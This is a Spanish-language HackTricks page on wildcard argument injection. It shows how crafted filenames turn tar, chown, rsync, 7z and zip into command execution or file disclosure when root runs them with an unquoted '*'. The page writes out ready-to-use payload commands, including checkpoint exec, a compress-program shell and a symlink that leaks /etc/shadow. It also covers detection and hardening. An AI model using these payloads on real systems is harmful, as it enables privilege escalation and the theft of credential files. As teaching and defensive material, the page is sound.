# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> La inyección de **argumentos** con comodines (también conocida como *glob*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un comodín sin comillas como `*`.
> Dado que el shell expande el comodín **antes** de ejecutar el binario, un atacante que puede crear archivos en el directorio de trabajo puede elaborar nombres de archivos que comiencen con `-` para que sean interpretados como **opciones en lugar de datos**, efectivamente contrabandeando banderas arbitrarias o incluso comandos.
> Esta página recopila las primitivas más útiles, investigaciones recientes y detecciones modernas para 2023-2025.

## chown / chmod

Puedes **copiar el propietario/grupo o los bits de permiso de un archivo arbitrario** abusando de la bandera `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Cuando el root luego ejecuta algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` se inyecta, causando que *todos* los archivos coincidentes hereden la propiedad/permisos de `/root/secret``file`.

*PoC & herramienta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Consulte también el clásico documento de DefenseCode para más detalles.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Ejecute comandos arbitrarios abusando de la función **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una vez que root ejecuta por ejemplo `tar -czf /root/backup.tgz *`, `shell.sh` se ejecuta como root.

### bsdtar / macOS 14+

El `tar` por defecto en las versiones recientes de macOS (basado en `libarchive`) *no* implementa `--checkpoint`, pero aún puedes lograr la ejecución de código con la bandera **--use-compress-program** que te permite especificar un compresor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.

---

## rsync

`rsync` te permite anular el shell remoto o incluso el binario remoto a través de banderas de línea de comandos que comienzan con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archiva más tarde el directorio con `rsync -az * backup:/srv/`, la bandera inyectada genera tu shell en el lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Incluso cuando el script privilegiado *defensivamente* antepone el comodín con `--` (para detener el análisis de opciones), el formato 7-Zip admite **archivos de lista de archivos** anteponiendo el nombre del archivo con `@`. Combinar eso con un symlink te permite *exfiltrar archivos arbitrarios*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root ejecuta algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip intentará leer `root.txt` (→ `/etc/shadow`) como una lista de archivos y se detendrá, **imprimiendo el contenido en stderr**.

---

## zip

`zip` admite la bandera `--unzip-command` que se pasa *verbatim* a la shell del sistema cuando se probará el archivo:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inyecta la bandera a través de un nombre de archivo elaborado y espera a que el script de respaldo privilegiado llame a `zip -T` (probar archivo) en el archivo resultante.

---

## Binarios adicionales vulnerables a la inyección de comodines (lista rápida 2023-2025)

Los siguientes comandos han sido abusados en CTFs modernos y entornos reales. La carga útil siempre se crea como un *nombre de archivo* dentro de un directorio escribible que luego será procesado con un comodín:

| Binario | Bandera a abusar | Efecto |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrario `@file` | Leer contenido del archivo |
| `flock` | `-c <cmd>` | Ejecutar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Ejecución de comando a través de git sobre SSH |
| `scp`   | `-S <cmd>` | Iniciar programa arbitrario en lugar de ssh |

Estos primitivos son menos comunes que los clásicos *tar/rsync/zip* pero vale la pena revisarlos al buscar.

---

## Detección y Endurecimiento

1. **Desactivar globbing de shell** en scripts críticos: `set -f` (`set -o noglob`) previene la expansión de comodines.
2. **Citar o escapar** argumentos: `tar -czf "$dst" -- *` *no* es seguro — preferir `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Rutas explícitas**: Usa `/var/www/html/*.log` en lugar de `*` para que los atacantes no puedan crear archivos hermanos que comiencen con `-`.
4. **Menor privilegio**: Ejecuta trabajos de respaldo/mantenimiento como una cuenta de servicio no privilegiada en lugar de root siempre que sea posible.
5. **Monitoreo**: La regla predefinida de Elastic *Potential Shell via Wildcard Injection* busca `tar --checkpoint=*`, `rsync -e*`, o `zip --unzip-command` seguido inmediatamente por un proceso hijo de shell. La consulta EQL puede adaptarse para otros EDRs.

---

## Referencias

* Elastic Security – Regla detectada de Potencial Shell vía Inyección de Comodines (última actualización 2025)
* Rutger Flohil – “macOS — Inyección de comodines en Tar” (18 de diciembre de 2024)

{{#include ../../banners/hacktricks-training.md}}
